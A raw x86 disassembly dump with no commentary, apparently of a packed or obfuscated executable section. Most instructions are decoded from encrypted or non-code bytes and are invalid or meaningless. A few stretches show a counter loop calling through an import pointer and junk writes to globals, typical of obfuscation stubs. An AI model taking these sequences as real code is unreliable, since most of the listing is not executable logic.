  415e4e:	icebp  
  415e4f:	push   ebp
  415e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e51:	mov    ebx,0x664a3a81
  415e56:	xchg   esi,eax
  415e57:	rcr    BYTE PTR [edi+0x1b],cl
  415e5a:	enter  0xdb7d,0xd2
  415e5e:	adc    bh,dh
  415e60:	call   0xe5af7e30
  415e65:	pushf  
  415e66:	fisttp WORD PTR [esi+0x5019eba7]
  415e6c:	or     al,BYTE PTR [ebp-0x11c0137c]
  415e72:	jo     0x415ec3
  415e74:	xchg   edi,eax
  415e75:	push   eax
  415e76:	jmp    0xaa7b4ef5
  415e7b:	sub    edx,DWORD PTR [ebx+0x7d]
  415e7e:	mov    WORD PTR [esi+0x63],?
  415e81:	add    esp,ecx
  415e83:	fs mov ecx,0xd4a71cb2
  415e89:	add    DWORD PTR [ebx-0x43],ecx
  415e8c:	fwait
  415e8d:	and    ah,BYTE PTR [esi+ecx*8]
  415e90:	xor    eax,0xbc33bcdf
  415e95:	js     0x415e42
  415e97:	jno    0x415eaa
  415e99:	mov    edx,0x1021aed9
  415e9e:	xor    dl,BYTE PTR [edi+0x1]
  415ea1:	fwait
  415ea2:	jmp    0xa73e:0x413989ef
  415ea9:	shl    BYTE PTR [ebx],cl
  415eab:	jbe    0x415e66
  415ead:	fwait
  415eae:	jmp    eax
  415eb0:	shl    DWORD PTR [ecx+0x654a3f4d],1
  415eb6:	test   al,0xfc
  415eb8:	jno    0x415e54
  415eba:	push   0x2f4cbf6d
  415ebf:	xchg   edx,eax
  415ec0:	fstp   QWORD PTR ds:0x36068706
  415ec6:	jbe    0x415f0c
  415ec8:	js     0x415e73
  415eca:	inc    ebx
  415ecb:	ds in  al,dx
  415ecd:	jl     0x415ece
  415ecf:	add    ebx,DWORD PTR [ebx+0x69]
  415ed2:	push   edx
  415ed3:	(bad)  
  415ed4:	clc    
  415ed5:	jmp    0xe970:0xe320101c
  415edc:	jge    0x415f18
  415ede:	inc    ecx
  415edf:	add    ah,al
  415ee1:	ficomp WORD PTR [ebp-0x76176c96]
  415ee7:	inc    ebp
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a79d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a821,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a825,0x42a7e1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	mul    DWORD PTR [ebp-0x59]
  415f4d:	shl    DWORD PTR [edi],1
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f6b
  415f57:	aad    0xe
  415f59:	adc    bh,BYTE PTR [esi]
  415f5b:	(bad)  
  415f5d:	mov    ebx,0x1785652e
  415f62:	paddd  mm4,QWORD PTR ds:0x1f5d14e
  415f69:	mov    esp,DWORD PTR [ebx+ecx*1-0x15]
  415f6d:	fidivr WORD PTR [ecx-0x55]
  415f70:	add    ebp,DWORD PTR [ebp+0x38]
  415f73:	adc    ah,BYTE PTR [edx+0x61]
  415f76:	je     0x415f6e
  415f78:	mov    esi,0xb899b66f
  415f7d:	fdivr  DWORD PTR [ecx-0x5aa939f3]
  415f83:	sbb    al,0xef
  415f85:	mov    edi,0x30581b71
  415f8a:	cdq    
  415f8b:	sbb    eax,0xefab440
  415f91:	aas    
  415f92:	adc    DWORD PTR [ebp+0x4fad2579],0xedb48a2f
  415f9c:	call   0xd33f:0xa01d639c
  415fa3:	sub    ch,dh
  415fa5:	pop    esp
  415fa6:	push   es
  415fa7:	(bad)  
  415fa8:	and    al,0xf7
  415faa:	ret    0x3a71
  415fad:	jmpw   0x302a
  415fb1:	fisttp DWORD PTR [ebx+0x50]
  415fb4:	rcl    bl,0xcc
  415fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fb8:	scas   al,BYTE PTR es:[edi]
  415fb9:	not    BYTE PTR [ebp+0x7]
  415fbc:	fcmove st,st(1)
  415fbe:	rcl    BYTE PTR [ecx+ebp*4],0xe4
  415fc2:	cmp    eax,0x4fb9b657
  415fc7:	sub    DWORD PTR [eax],eax
  415fc9:	xchg   esi,eax
  415fca:	jns    0x415ffa
  415fcc:	jmp    0x7a5e10e8
  415fd1:	sti    
  415fd2:	sub    eax,0x989f36d8
  415fd7:	xlat   BYTE PTR ds:[ebx]
  415fd8:	fnstenv [esi]
  415fda:	icebp  
  415fdb:	fs jl  0x41600a
  415fde:	and    BYTE PTR [ecx],ch
  415fe0:	mov    esp,0x4a712009
  415fe5:	cmp    ch,BYTE PTR [ebx+0x54df350d]
  415feb:	sbb    DWORD PTR ds:0xd90d1d2,0xd4953fbb
  415ff5:	xor    eax,0x3177870f
  415ffa:	lds    edx,FWORD PTR [ebx+0x16a93916]
  416000:	jmp    0xa1ef:0x77828b78
  416007:	cmp    esp,esi
  416009:	push   eax
  41600a:	inc    ebx
  41600b:	pop    esp
  41600c:	(bad)  
  41600d:	out    0xd8,al
  41600f:	mov    al,0x7f
  416011:	jno    0x415feb
  416013:	xor    al,al
  416015:	std    
  416016:	rcl    DWORD PTR [ecx-0xa5af69f],1
  41601c:	fbstp  TBYTE PTR [esi]
  41601e:	inc    edx
  41601f:	mov    esp,0x85bf4df1
  416024:	ror    DWORD PTR [eax-0x42],0x69
  416028:	xor    DWORD PTR [ecx-0x62],eax
  41602b:	or     BYTE PTR ds:[ebx+0x1a14ef07],0x51
  416033:	xchg   esi,eax
  416034:	in     al,0xe9
  416036:	jb     0x415fbf
  416038:	shl    DWORD PTR ds:0xcbb2919f,0x2e
  41603f:	pusha  
  416040:	mov    eax,ds:0x612973a8
  416045:	adc    edx,edx
  416047:	je     0x415fe0
  416049:	jo     0x415fd9
  41604b:	mov    dh,0x3b
  41604d:	mov    al,0x9a
  41604f:	add    ah,dl
  416051:	push   esp
  416052:	scas   al,BYTE PTR es:[edi]
  416053:	in     al,0x76
  416055:	mov    edi,0x623545c
  41605a:	push   cs
  41605b:	and    ch,BYTE PTR ds:0x8ad18c38
  416061:	jb     0x41603d
  416063:	cwde   
  416064:	call   0xf4cb:0xc879a889
  41606b:	stc    
  41606c:	push   ecx
  41606d:	pop    esp
  41606e:	sub    eax,0xc0ee4103
  416073:	sub    al,0x78
  416075:	cmp    al,BYTE PTR [eax]
  416077:	fnstenv [edx-0x2b]
  41607a:	pop    ss
  41607b:	inc    eax
  41607c:	mov    al,ds:0x5626cf2b
  416081:	(bad)  
  416082:	rol    DWORD PTR [edx-0x5a],cl
  416085:	ror    BYTE PTR [bx+si+0x129e],cl
  41608a:	ins    DWORD PTR es:[edi],dx
  41608b:	jne    0x416104
  41608d:	mov    ebx,0x989ec107
  416092:	xchg   DWORD PTR [ecx-0x4b255855],ebp
  416098:	in     al,dx
  416099:	ficom  WORD PTR [esi-0x80]
  41609c:	adc    bl,al
  41609e:	jne    0x416047
  4160a0:	(bad)  
  4160a2:	aas    
  4160a3:	loop   0x4160ce
  4160a5:	cmp    BYTE PTR [esi],al
  4160a7:	cmp    DWORD PTR [esi+0x19bffd62],eax
  4160ad:	mov    DWORD PTR [esi-0x59657bb1],ecx
  4160b3:	mov    dh,BYTE PTR [esi-0x7b]
  4160b6:	test   BYTE PTR [edx-0x32],cl
  4160b9:	cmp    cl,BYTE PTR [ebp+0x49]
  4160bc:	cmp    bl,cl
  4160be:	pusha  
  4160bf:	jae    0x4160de
  4160c1:	sbb    eax,0xc6955b8d
  4160c6:	jle    0x41611c
  4160c8:	and    al,0x91
  4160ca:	stc    
  4160cb:	sti    
  4160cc:	push   edi
  4160cd:	add    dh,cl
  4160cf:	ins    BYTE PTR es:[edi],dx
  4160d0:	bound  edx,QWORD PTR [eax]
  4160d2:	ja     0x4160dd
  4160d4:	into   
  4160d5:	push   eax
  4160d6:	fisttp WORD PTR [edx]
  4160d8:	and    eax,0xf79a15c4
  4160dd:	or     bh,BYTE PTR [eax+0xa]
  4160e0:	ret    
  4160e1:	stos   BYTE PTR es:[edi],al
  4160e2:	mov    DWORD PTR [esi],edi
  4160e4:	ror    DWORD PTR [eax+ebx*4],1
  4160e7:	stos   BYTE PTR es:[edi],al
  4160e8:	xchg   edx,eax
  4160e9:	ret    
  4160ea:	test   eax,0x70ac5f25
  4160ef:	jb     0x4160a7
  4160f1:	cld    
  4160f2:	xchg   ebp,eax
  4160f3:	mov    al,ds:0x1a95198
  4160f8:	sbb    bl,ch
  4160fa:	jne    0x4160e1
  4160fc:	sbb    DWORD PTR [esi+0x276204d3],ebx
  416102:	std    
  416103:	mov    bl,0xf9
  416105:	sbb    eax,0xd1fdd233
  41610a:	or     al,0x8e
  41610c:	cli    
  41610d:	icebp  
  41610e:	push   ss
  41610f:	inc    BYTE PTR [esi]
  416111:	out    0x96,al
  416113:	inc    ebx
  416114:	jb     0x41615c
  416116:	inc    esp
  416117:	jl     0x4160b9
  416119:	ja     0x4160b0
  41611b:	call   0x6f4b8416
  416120:	pop    edi
  416121:	loopne 0x416168
  416123:	and    bl,BYTE PTR [edx]
  416125:	enter  0x4ab5,0x75
  416129:	mov    al,0x78
  41612b:	int    0xc2
  41612d:	stos   BYTE PTR es:[edi],al
  41612e:	in     eax,dx
  41612f:	mov    ds:0xd4015aca,al
  416134:	out    0x60,al
  416136:	fsub   st(5),st
  416138:	adc    al,0x80
  41613a:	pop    es
  41613b:	jo     0x41617d
  41613d:	add    eax,0xe0f96f7
  416142:	ja     0x41612d
  416144:	(bad)  
  416145:	outs   dx,DWORD PTR ds:[esi]
  416146:	and    cl,0x8
  416149:	(bad)  [esi+ebp*4-0x1754a36f]
  416150:	xor    esi,DWORD PTR [edi]
  416152:	mov    bh,0x9b
  416154:	sti    
  416155:	loop   0x416196
  416157:	pop    eax
  416158:	sbb    ebp,DWORD PTR [esi+0x76]
  41615b:	jle    0x416173
  41615d:	jl     0x41614a
  41615f:	lods   eax,DWORD PTR ds:[esi]
  416160:	push   edx
  416161:	ja     0x416100
  416163:	fidiv  DWORD PTR [esi]
  416165:	sbb    DWORD PTR [edx-0x75],0xb515e836
  41616c:	sbb    eax,0xd751c827
  416171:	dec    ecx
  416172:	xchg   ecx,eax
  416173:	pop    esp
  416174:	jb     0x41619f
  416176:	xor    eax,0x737ae658
  41617b:	scas   al,BYTE PTR es:[edi]
  41617c:	loopne 0x4161ba
  41617e:	xlat   BYTE PTR ds:[ebx]
  41617f:	ret    0x99fc
  416182:	je     0x41613e
  416184:	imul   bp,WORD PTR [edi+0x1253ac8b],0xffdb
  41618c:	mov    ah,0xf0
  41618e:	(bad)  [eax]
  416190:	test   cl,bh
  416192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416193:	ret    
  416194:	or     esi,edi
  416196:	xchg   esi,eax
  416197:	in     eax,0xac
  416199:	xchg   ebx,eax
  41619a:	mov    ebp,0xbf84ec74
  41619f:	fstp   TBYTE PTR [esi-0x6b]
  4161a2:	je     0x41618b
  4161a4:	and    BYTE PTR [ebp+0x344e4fa4],ch
  4161aa:	mov    dl,BYTE PTR [eax]
  4161ac:	sbb    dh,ah
  4161ae:	fdivr  DWORD PTR [ebp-0x3c]
  4161b1:	fs out dx,al
  4161b3:	inc    ebp
  4161b4:	mov    edx,0xee4624f0
  4161b9:	sub    BYTE PTR [esi+ebp*2+0x30f42b8b],al
  4161c0:	push   eax
  4161c1:	jns    0x41622c
  4161c3:	dec    eax
  4161c4:	sbb    ah,BYTE PTR [eax+0x5b196ef5]
  4161ca:	jg     0x41614d
  4161cc:	push   edx
  4161cd:	push   esp
  4161ce:	and    al,0xcb
  4161d0:	js     0x416160
  4161d2:	lods   eax,DWORD PTR ds:[esi]
  4161d3:	and    al,BYTE PTR [ebx]
  4161d5:	mov    bl,0xd1
  4161d7:	pop    edi
  4161d8:	and    ch,BYTE PTR [edx]
  4161da:	adc    eax,0x39f108f5
  4161df:	daa    
  4161e0:	pop    esp
  4161e1:	(bad)  
  4161e2:	adc    eax,DWORD PTR [esi+0x7]
  4161e5:	data16 mov ah,0x61
  4161e8:	cld    
  4161e9:	push   0xffffffa2
  4161eb:	mov    eax,ds:0x38602158
  4161f0:	cmp    DWORD PTR [ebx+0x5c7fc45],ecx
  4161f6:	lods   eax,DWORD PTR ds:[esi]
  4161f7:	test   al,0x42
  4161f9:	add    BYTE PTR [eax+eax*1],bl
  4161fc:	add    BYTE PTR [eax],al
  4161fe:	cmp    DWORD PTR ds:0x42a8ad,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a8ad,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a8ad,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a8ad
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a8ad,edx
  416249:	mov    edx,DWORD PTR ds:0x42a8ad
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a8ad,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a789,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a861,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x56b71746]
  416290:	add    DWORD PTR [eax+ebx*1+0x7e95787f],edi
  416297:	js     0x416311
  416299:	mov    esp,0x3f94ef56
  41629e:	push   ecx
  41629f:	icebp  
  4162a0:	imul   ebp,DWORD PTR es:[ebx-0x36],0x4d
  4162a5:	clc    
  4162a6:	jns    0x41628a
  4162a8:	stc    
  4162a9:	inc    BYTE PTR [esi]
  4162ab:	mov    BYTE PTR [esp+eiz*8],ch
  4162ae:	ins    DWORD PTR es:[edi],dx
  4162af:	sub    edi,edx
  4162b1:	mov    bh,0x65
  4162b3:	outs   dx,DWORD PTR ds:[esi]
  4162b4:	(bad)  
  4162b5:	inc    edi
  4162b6:	addr16 mov edi,esp
  4162b9:	fistp  QWORD PTR [edx-0x6e]
  4162bc:	pop    edi
  4162bd:	pop    ss
  4162be:	xchg   esp,eax
  4162bf:	int    0x18
  4162c1:	xchg   esi,eax
  4162c2:	not    eax
  4162c4:	pop    ss
  4162c5:	shr    BYTE PTR [eax],cl
  4162c7:	adc    ebp,ecx
  4162c9:	gs xchg edx,eax
  4162cb:	mov    edi,0xbcca3072
  4162d0:	jmp    0x4162b2
  4162d2:	fidivr WORD PTR [ebp+0x4b948625]
  4162d8:	mov    ch,BYTE PTR ds:0x4e9949ed
  4162de:	mov    edx,0x9d42cc49
  4162e3:	cmp    DWORD PTR [ecx+eiz*4-0x15fb262c],ebp
  4162ea:	cdq    
  4162eb:	imul   ebx,DWORD PTR [ebx],0x9621aa7
  4162f1:	xchg   edi,eax
  4162f2:	mov    esi,0x2b771e47
  4162f7:	adc    cl,BYTE PTR [eax-0x20]
  4162fa:	lea    esi,fs:[edx]
  4162fd:	jae    0x41630b
  4162ff:	dec    ecx
  416300:	stos   BYTE PTR es:[edi],al
  416301:	std    
  416302:	das    
  416303:	jmp    0xbbfc:0xac0f7ac5
  41630a:	ins    DWORD PTR es:[edi],dx
  41630b:	mov    ch,0x15
  41630d:	ret    0x46be
  416310:	xchg   esp,eax
  416311:	or     eax,DWORD PTR [ecx]
  416313:	lods   eax,DWORD PTR ds:[esi]
  416314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416315:	dec    eax
  416316:	sub    eax,0xec1d6587
  41631b:	xor    ebp,esp
  41631d:	pop    esi
  41631e:	push   esi
  41631f:	ror    DWORD PTR [edx+0xa],1
  416322:	call   0xa805e0de
  416327:	mov    WORD PTR [edi-0x7b],fs
  41632a:	mov    edi,0x1fa651a0
  41632f:	loopne 0x4163a3
  416331:	dec    ebx
  416332:	ret    
  416333:	and    BYTE PTR [ebx],0x54
  416336:	push   ss
  416337:	rol    BYTE PTR [ebx+0x2b956751],0xe
  41633e:	or     esi,esp
  416340:	sbb    eax,0x5502e790
  416345:	and    dh,bl
  416347:	mov    eax,ds:0xe805d02f
  41634c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41634d:	mov    al,ds:0x7550c050
  416352:	mov    DWORD PTR [ebx],ebx
  416354:	in     al,0x6
  416356:	adc    DWORD PTR ds:[edi-0x69],esp
  41635a:	mov    ds:0x8d916672,al
  41635f:	mov    ecx,0xc4509d9b
  416364:	popf   
  416365:	(bad)  
  416366:	mov    eax,ds:0x9efc47ff
  41636b:	adc    al,0x29
  41636d:	imul   edi,DWORD PTR [eax],0x5ff885f5
  416373:	not    DWORD PTR [ecx]
  416375:	push   0xffffff94
  416377:	sbb    edi,DWORD PTR [edi+0x4d]
  41637a:	call   0xdd31:0x4f86fa5
  416381:	push   edi
  416382:	xor    dl,BYTE PTR [ecx+0x32c1e96f]
  416388:	imul   ebp,DWORD PTR [eax-0x3b],0xcee5a921
  41638f:	daa    
  416390:	fmul   DWORD PTR [ebx-0x30]
  416393:	mov    esi,0x34dd3c6
  416398:	jp     0x416338
  41639a:	test   eax,0xe222218a
  41639f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a0:	mov    esi,0x6f40d350
  4163a5:	pop    ecx
  4163a6:	inc    sp
  4163a8:	rol    BYTE PTR [ecx+ebx*8-0x3534ba7b],1
  4163af:	jl     0x41634d
  4163b1:	xor    ebx,edx
  4163b3:	xchg   edi,eax
  4163b4:	mov    esi,0x7d13d858
  4163b9:	inc    ebp
  4163ba:	xchg   ecx,eax
  4163bb:	xlat   BYTE PTR ds:[ebx]
  4163bc:	sbb    ecx,DWORD PTR [edx]
  4163be:	xchg   esi,eax
  4163bf:	lds    ebp,FWORD PTR [ebp-0x64cc32f8]
  4163c5:	add    al,0x8f
  4163c7:	test   eax,0x95b9a487
  4163cc:	adc    eax,0x961198c1
  4163d1:	fmul   QWORD PTR [ecx-0x4d]
  4163d4:	mov    DWORD PTR [ebp-0x305d9fd4],0x3ba3e864
  4163de:	mov    dh,0x3d
  4163e0:	les    esi,FWORD PTR [edx+0x4cbec864]
  4163e6:	jle    0x4163ae
  4163e8:	(bad)  
  4163e9:	inc    ebx
  4163ea:	test   eax,edi
  4163ec:	mov    ch,0x55
  4163ee:	lea    edx,[edi-0x7]
  4163f1:	pop    ss
  4163f2:	mov    WORD PTR [edx-0x1b0feb3b],?
  4163f8:	int    0x6f
  4163fa:	ret    0x90fc
  4163fd:	cmc    
  4163fe:	jno    0x41647b
  416400:	jmp    0x41639c
  416402:	jg     0x416387
  416404:	mov    DWORD PTR [ecx-0x32],ebp
  416407:	ins    BYTE PTR es:[edi],dx
  416408:	lods   al,BYTE PTR ds:[esi]
  416409:	pop    ebp
  41640a:	enter  0x3c72,0xb2
  41640e:	or     ecx,DWORD PTR gs:[edx+esi*4-0x3d3f6b2b]
  416416:	ins    BYTE PTR es:[edi],dx
  416417:	xor    eax,0xab91bc26
  41641c:	rcl    bh,0x13
  41641f:	and    ah,BYTE PTR [ebx+0x3c82ab4a]
  416425:	retf   0x1e33
  416428:	cmp    BYTE PTR [ecx-0x4f],ah
  41642b:	adc    eax,0xa8c6da25
  416430:	bound  esp,QWORD PTR [edx+0x1699a2b7]
  416436:	and    DWORD PTR [ebp-0x30],ecx
  416439:	adc    BYTE PTR [edi],0x7a
  41643c:	adc    esp,esp
  41643e:	(bad)  
  41643f:	mul    BYTE PTR ds:[ebp+eiz*4+0x12]
  416444:	jg     0x41640b
  416446:	ins    BYTE PTR es:[edi],dx
  416447:	dec    esp
  416448:	stc    
  416449:	fidiv  WORD PTR [esi+ebp*1-0xf]
  41644d:	cdq    
  41644e:	leave  
  41644f:	call   0x991e:0x4dd3dc3
  416456:	cmp    al,0x3
  416458:	jecxz  0x416491
  41645a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41645b:	imul   edi,DWORD PTR [ecx],0xbe160c31
  416461:	pop    esp
  416462:	xchg   edx,eax
  416463:	sti    
  416464:	push   esp
  416465:	pop    esp
  416466:	xchg   ebx,eax
  416467:	pop    edx
  416468:	stc    
  416469:	iret   
  41646a:	sub    al,0x7
  41646c:	mov    eax,0xd1f115da
  416471:	stc    
  416472:	(bad)  
  416473:	mov    edi,esi
  416475:	lods   eax,DWORD PTR ds:[esi]
  416476:	jp     0x4164bc
  416478:	xchg   edx,eax
  416479:	jl     0x416410
  41647b:	lds    ecx,FWORD PTR [ebx+ebp*2+0x4f]
  41647f:	cmp    eax,0x62edd6c7
  416484:	cmp    al,0xae
  416486:	retf   0x6404
  416489:	xor    ah,BYTE PTR [esp+esi*1+0x4ac4c041]
  416490:	and    dl,0xf1
  416493:	fwait
  416494:	pop    ds
  416495:	and    esp,DWORD PTR [edi]
  416497:	jle    0x416429
  416499:	mov    ebx,DWORD PTR [ebp-0x197e6950]
  41649f:	mov    ds:0x3d6301d7,eax
  4164a4:	push   edx
  4164a5:	(bad)  
  4164a6:	adc    DWORD PTR [ebx-0x2fab8d],ebx
  4164ac:	and    dh,BYTE PTR [edx-0x32]
  4164af:	jnp    0x4164e9
  4164b1:	jl     0x41651f
  4164b3:	sub    edx,ebx
  4164b5:	xchg   esi,eax
  4164b6:	ins    DWORD PTR es:[edi],dx
  4164b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b8:	or     BYTE PTR [edx-0x28],ch
  4164bb:	jmp    0x5d93059d
  4164c0:	cs nop
  4164c2:	iret   
  4164c3:	add    ebp,ebx
  4164c5:	fldenv [esi-0x2b]
  4164c8:	dec    ebx
  4164c9:	in     al,dx
  4164ca:	fwait
  4164cb:	jo     0x416462
  4164cd:	push   es
  4164ce:	ds out 0xc4,eax
  4164d1:	test   BYTE PTR [eax+0x49],dh
  4164d4:	ja     0x4164b7
  4164d6:	sub    eax,0x8fc23431
  4164db:	rcr    DWORD PTR [edx],0x52
  4164de:	(bad)  
  4164df:	loop   0x4164c6
  4164e1:	cmp    ah,bh
  4164e3:	in     al,dx
  4164e4:	xor    eax,0xef16d5f
  4164e9:	fwait
  4164ea:	ss jmp 0x41647a
  4164ed:	sbb    BYTE PTR [edi+0xd1de076],dl
  4164f3:	imul   esi,ebp,0xffffffc2
  4164f6:	add    BYTE PTR [esp+ebx*8+0x1be58e12],dl
  4164fd:	mov    al,0xb3
  4164ff:	aas    
  416500:	sbb    eax,0x3904b221
  416505:	inc    ebx
  416506:	shl    DWORD PTR [ebx-0x3d],1
  416509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41650a:	jmp    0xaf34:0xbb6633b8
  416511:	int3   
  416512:	or     eax,0x89254d64
  416517:	jnp    0x416543
  416519:	inc    esp
  41651a:	dec    ebx
  41651b:	dec    edx
  41651c:	outs   dx,DWORD PTR ds:[esi]
  41651d:	idiv   DWORD PTR [edi-0x1994b889]
  416523:	dec    ebx
  416524:	or     DWORD PTR ds:0x16c99e2b,edi
  41652a:	iret   
  41652b:	pop    ecx
  41652c:	mov    bl,0xcd
  41652e:	cmp    al,0x1e
  416530:	fxch   st(1)
  416532:	je     0x41655a
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x131c839a],cl
  416557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416558:	or     al,0x2c
  41655a:	fstp   DWORD PTR ds:0x7e95787f
  416560:	js     0x4165da
  416562:	mov    dh,0xd7
  416564:	or     al,0xa1
  416566:	push   ss
  416567:	dec    esp
  416568:	loope  0x416562
  41656a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41656b:	inc    edx
  41656c:	inc    ebp
  41656d:	cmp    eax,0x55c6ea13
  416572:	xor    al,0xfc
  416574:	adc    eax,DWORD PTR ds:0x4a19f899
  41657a:	inc    ecx
  41657b:	loopne 0x41656a
  41657d:	xor    DWORD PTR [ebp-0xeab9c19],ebp
  416583:	(bad)  
  416584:	in     al,dx
  416585:	or     BYTE PTR [ecx],cl
  416587:	jns    0x4165c7
  416589:	sub    ch,BYTE PTR [edi]
  41658b:	mov    cl,0xfe
  41658d:	sub    BYTE PTR ds:0x1908dc0b,0x69
  416594:	mov    dh,BYTE PTR [esi-0xf]
  416597:	adc    bl,BYTE PTR ds:0xfc2afdf
  41659d:	fld    DWORD PTR [eax+0xb]
  4165a0:	or     eax,edi
  4165a2:	out    0xb9,al
  4165a4:	inc    ebp
  4165a5:	into   
  4165a6:	clc    
  4165a7:	jge    0x416582
  4165a9:	mov    dh,0x8b
  4165ab:	ror    bh,1
  4165ad:	(bad)  
  4165ae:	pop    ss
  4165af:	xor    DWORD PTR [ebx-0x6ba7c23c],eax
  4165b5:	mov    eax,0x61093687
  4165ba:	imul   BYTE PTR [edi]
  4165bc:	mov    ds:0x900da7d1,eax
  4165c1:	push   ebp
  4165c2:	inc    ebx
  4165c3:	in     eax,0xea
  4165c5:	out    dx,eax
  4165c6:	out    dx,al
  4165c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c8:	add    ch,bh
  4165ca:	push   edi
  4165cb:	or     eax,0xf17207fe
  4165d0:	les    esp,FWORD PTR ds:0x3550f8f4
  4165d6:	jne    0x41658d
  4165d8:	adc    edx,ebp
  4165da:	loope  0x416570
  4165dc:	fisttp WORD PTR [edi]
  4165de:	jl     0x4165af
  4165e0:	inc    esp
  4165e1:	outs   dx,DWORD PTR ds:[esi]
  4165e2:	ja     0x416568
  4165e4:	xchg   BYTE PTR [esi+0x751f10a0],ah
  4165ea:	jle    0x4165c0
  4165ec:	xchg   esp,eax
  4165ed:	fisubr WORD PTR [eax-0x206d0ad]
  4165f3:	mov    ebx,0xe60c20d2
  4165f8:	out    dx,eax
  4165f9:	or     dh,BYTE PTR [edi+0x18]
  4165fc:	fisttp DWORD PTR [eax]
  4165fe:	mov    edi,0x6fdee6f7
  416603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416604:	mov    bl,0x9f
  416606:	cmp    ebp,ecx
  416608:	std    
  416609:	or     al,0x7f
  41660b:	inc    eax
  41660c:	push   edi
  41660d:	sub    al,0xde
  41660f:	pop    es
  416610:	leave  
  416611:	aam    0xe4
  416613:	and    ebx,DWORD PTR [esi]
  416615:	ret    0xcf10
  416618:	pop    edi
  416619:	(bad)  [esi-0x2e]
  41661c:	mov    edi,0x9123e697
  416621:	out    dx,al
  416622:	push   edi
  416623:	dec    ecx
  416624:	push   ss
  416625:	sub    ecx,DWORD PTR [ebx+0x0]
  416628:	cmp    dl,BYTE PTR [edi]
  41662a:	test   DWORD PTR [ebx+eax*1-0x79c7fd88],ebx
  416631:	pop    ecx
  416632:	add    ah,BYTE PTR [edi-0x6c5a273e]
  416638:	mov    eax,0x3b5944f5
  41663d:	sbb    BYTE PTR [eax-0x57],ah
  416640:	mov    al,ds:0xe8b4382d
  416645:	cmp    al,0x1b
  416647:	sub    edx,0x56f2aaa0
  41664d:	fiadd  WORD PTR [esi+0x6a]
  416650:	loope  0x416614
  416652:	call   FWORD PTR [edx+0x65]
  416655:	pop    esp
  416656:	sahf   
  416657:	imul   ebp,DWORD PTR [edx+0x75],0x566461e7
  41665e:	iret   
  41665f:	mov    al,BYTE PTR [ebx-0x65]
  416662:	dec    ebp
  416663:	test   al,0xd7
  416665:	imul   edi,DWORD PTR fs:[esi+0x2da83be0],0xef73bc28
  416670:	or     DWORD PTR [esi+0x1f],ecx
  416673:	test   eax,ebp
  416675:	nop
  416676:	cld    
  416677:	xchg   ebx,eax
  416678:	adc    al,0x34
  41667a:	sbb    al,0x99
  41667d:	adc    DWORD PTR [ebp-0x13b6b3a7],esi
  416683:	sbb    eax,0xfc980b07
  416688:	push   edi
  416689:	mov    ds:0x8e8ee97f,eax
  41668e:	xchg   ecx,eax
  41668f:	adc    ebp,eax
  416691:	cmc    
  416692:	jbe    0x4166e9
  416694:	loop   0x4166e7
  416696:	gs mov ch,0x8a
  416699:	mov    eax,ds:0x3e706f0c
  41669e:	push   ds
  41669f:	xchg   ebp,eax
  4166a0:	sti    
  4166a1:	dec    ebp
  4166a2:	mov    DWORD PTR [ebx+0x5aead50a],ecx
  4166a8:	sahf   
  4166a9:	es into 
  4166ab:	rcr    DWORD PTR [edi],cl
